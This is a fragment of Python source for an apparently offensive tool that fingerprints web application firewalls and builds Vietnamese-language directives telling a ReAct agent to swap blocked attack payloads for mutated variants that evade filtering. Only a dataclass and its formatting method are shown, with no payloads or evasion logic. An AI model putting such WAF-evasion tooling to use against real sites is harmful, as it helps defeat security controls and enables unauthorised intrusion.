"""Dynamic Defense Fingerprinting & WAF Rule Decompiler.

Fingerprints active Web Application Firewalls (Cloudflare, ModSecurity, AWS WAF,
Imperva, Akamai, F5 BIG-IP) and reverse-engineers blocked payload syntax to
decompile triggering regex rules (OWASP CRS Rule IDs) and synthesize token-level
evasion bypasses.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Any, Optional


@dataclass
class BlockedTokenAnalysis:
    """Detailed reverse-engineered analysis of a blocked payload."""

    detected_waf: str
    original_payload: str
    blocked_tokens: list[str]
    probable_rule_id: str
    recommended_evasions: list[str]
    mutated_alternatives: list[str]

    def format_block(self) -> str:
        """Format tactical WAF decompiler directive for the ReAct orchestrator."""
        tokens_str = ", ".join(f"`{t}`" for t in self.blocked_tokens)
        evasions_str = "\n".join(f"   - {e}" for e in self.recommended_evasions)
        alts_str = "\n".join(f"   • `{m}`" for m in self.mutated_alternatives[:3])

        return (
            f"🛡️ [GIẢI MÃ QUY TẮC PHÒNG THỦ WAF & BỘ LỌC TỰ ĐỘNG]\n"
            f"• WAF Nhận Diện: {self.detected_waf or 'Generic WAF/IPS'}\n"
            f"• Token Gây Kích Hoạt Bộ Lọc (Trigger): {tokens_str or 'Chuỗi truy vấn bất thường'}\n"
            f"• Quy Tắc Tương Quan Dự Đoán: {self.probable_rule_id}\n"
            f"• Chiến Thuật Vượt Qua (Evasion Recommendations):\n{evasions_str}\n"
            f"• Các Biến Thể Đã Đột Biến (Mutated Payloads Sẵn Sàng):\n{alts_str}\n"
            f"➔ HÃY THAY THẾ PAYLOAD BẰNG CÁC BIẾN THỂ TRÊN ĐỂ TRÁNH BỊ CHẶN HTTP 403/406."
        )


